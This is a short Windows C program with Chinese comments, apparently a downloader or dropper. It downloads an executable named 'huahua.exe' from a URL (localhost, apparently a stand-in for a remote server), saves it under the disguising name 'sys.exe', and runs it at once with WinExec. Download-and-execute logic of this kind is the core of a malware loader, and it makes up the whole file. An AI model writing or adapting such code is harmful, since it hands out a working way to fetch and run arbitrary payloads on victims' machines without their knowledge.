#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<urlmon.h>

#pragma comment(lib,"Urlmon.lib")				//链接库

void main() {
	URLDownloadToFileA(NULL, "http://127.0.0.1/huahua.exe", "G:\\sys.exe", 0, NULL);
	WinExec("G:\\sys.exe", SW_SHOW);			//启动应用程序										

}